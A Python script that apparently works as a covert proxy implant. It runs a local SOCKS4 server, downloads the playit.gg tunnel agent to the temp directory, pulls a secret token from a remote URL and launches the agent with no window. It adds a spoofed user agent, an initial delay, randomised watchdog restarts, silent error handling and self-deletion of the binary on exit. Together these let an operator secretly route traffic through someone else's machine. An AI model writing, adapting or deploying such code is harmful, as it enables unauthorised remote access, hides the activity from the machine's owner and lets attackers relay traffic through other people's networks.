import os
import sys
import platform
import tempfile
import threading
import time
import subprocess
import requests
import socketserver
import struct
import socket
import random
import re
import select
import atexit
import signal

# --- CONFIGURATION & CONSTANTS ---
PLAYIT_GITHUB_AUTH_TOKEN_RAW_URL = 'HERE_Provide_Playit_key_raw_url'
PROXY_HOST = '127.0.0.1'
PROXY_PORT = 8088
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
CHECK_INTERVAL_MIN_SECONDS = 60
CHECK_INTERVAL_MAX_SECONDS = 120
INITIAL_DELAY_SECONDS = 10
WINDOWS_PLAYIT_URL = 'https://github.com/playit-cloud/playit-agent/releases/download/v0.16.3/playit-windows-x86_64.exe'
LINUX_PLAYIT_URL = 'https://github.com/playit-cloud/playit-agent/releases/download/v0.16.3/playit-linux-amd64'

# --- GLOBAL STATE ---
auth_token = None
playit_process = None
playit_executable_path = None
proxy_server_thread = None

# --- STABLE SOCKS4 PROXY IMPLEMENTATION ---
class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

class Socks4Handler(socketserver.StreamRequestHandler):
    def handle(self):
        try:
            data = self.rfile.read(8)
            if len(data) < 8: return
            vn, cmd, dstport, dstip = data[0], data[1], struct.unpack('>H', data[2:4])[0], data[4:8]
            if vn != 4 or cmd != 1: return
            user_id = b''
            while True:
                c = self.rfile.read(1)
                if c in (b'\x00', b''): break
                user_id += c
            dstip_str = socket.inet_ntoa(dstip)
            remote = socket.create_connection((dstip_str, dstport), timeout=10)
            self.wfile.write(b"\x00\x5a" + data[2:4] + data[4:8])
            self.exchange_loop(self.connection, remote)
        except Exception:
            pass
        finally:
            self.server.shutdown_request(self.request)

    def exchange_loop(self, client, remote):
        client.setblocking(False)
        remote.setblocking(False)
        while True:
            readable, _, exceptional = select.select([client, remote], [], [client, remote], 0.1)
            if exceptional: break
            for sock in readable:
                try:
                    data = sock.recv(4096)
                    if not data: return
                    if sock is client: remote.sendall(data)
                    else: client.sendall(data)
                except socket.error: return

def start_proxy_server():
    try:
        with ThreadingTCPServer((PROXY_HOST, PROXY_PORT), Socks4Handler) as server:
            server.serve_forever()
    except Exception:
        pass

# --- PLAYIT.GG & AUTH MANAGEMENT ---
def fetch_auth_token():
    global auth_token
    if auth_token: return True
    try:
        headers = {'User-Agent': USER_AGENT}
        response = requests.get(PLAYIT_GITHUB_AUTH_TOKEN_RAW_URL, headers=headers, timeout=15)
        response.raise_for_status()
        content = response.text.strip()
        if re.fullmatch(r'[a-fA-F0-9]{64}', content):
            auth_token = content
            return True
        return False
    except Exception:
        return False

def download_playit_executable():
    global playit_executable_path
    os_type = platform.system().lower()
    arch = platform.machine().lower()

    if os_type == 'windows' and '64' in arch:
        url, filename = WINDOWS_PLAYIT_URL, 'playit.exe'
    elif os_type == 'linux' and ('x86_64' in arch or 'amd64' in arch):
        url, filename = LINUX_PLAYIT_URL, 'playit'
    else:
        return False

    temp_dir = tempfile.gettempdir()
    path = os.path.join(temp_dir, filename)
    playit_executable_path = path

    try:
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            os.chmod(path, 0o755)
            return True
            
        headers = {'User-Agent': USER_AGENT}
        response = requests.get(url, headers=headers, timeout=60, allow_redirects=True)
        response.raise_for_status()
        with open(path, 'wb') as f: f.write(response.content)
        os.chmod(path, 0o755)
        return True
    except Exception:
        return False

def start_playit_process():
    global playit_process
    if not all([auth_token, playit_executable_path, os.path.exists(playit_executable_path)]):
        return False
    
    command = [playit_executable_path, '--secret', auth_token]
    
    try:
        if platform.system().lower() == 'windows':
            flags = 0x08000000 # CREATE_NO_WINDOW
            playit_process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=flags)
        else:
            playit_process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)
        return True
    except Exception:
        return False

# --- CLEANUP AND SHUTDOWN ---
def cleanup():
    """Terminates the child process and deletes the executable."""
    try:
        if playit_process and playit_process.poll() is None:
            playit_process.terminate()
            playit_process.wait(timeout=2)
    except Exception:
        pass
    
    try:
        if playit_executable_path and os.path.exists(playit_executable_path):
            os.remove(playit_executable_path)
    except Exception:
        pass

def signal_handler(signum, frame):
    """Handles termination signals to ensure cleanup is called before exit."""
    cleanup()
    sys.exit(0)

# Register the cleanup handlers
atexit.register(cleanup) # For normal interpreter exit
signal.signal(signal.SIGTERM, signal_handler) # For shutdown/kill signals
signal.signal(signal.SIGINT, signal_handler) # For Ctrl+C

# --- MONITORING AND SELF-HEALING ---
def is_process_running(proc):
    return proc is not None and proc.poll() is None

def monitor_and_heal():
    global proxy_server_thread, playit_process
    if not download_playit_executable(): sys.exit(1)
    if not fetch_auth_token(): sys.exit(2)

    while True:
        if not proxy_server_thread or not proxy_server_thread.is_alive():
            proxy_server_thread = threading.Thread(target=start_proxy_server, daemon=True)
            proxy_server_thread.start()

        if not is_process_running(playit_process):
            start_playit_process()

        time.sleep(random.randint(CHECK_INTERVAL_MIN_SECONDS, CHECK_INTERVAL_MAX_SECONDS))

# --- MAIN EXECUTION ---
if __name__ == '__main__':
    time.sleep(INITIAL_DELAY_SECONDS)
    monitor_and_heal()


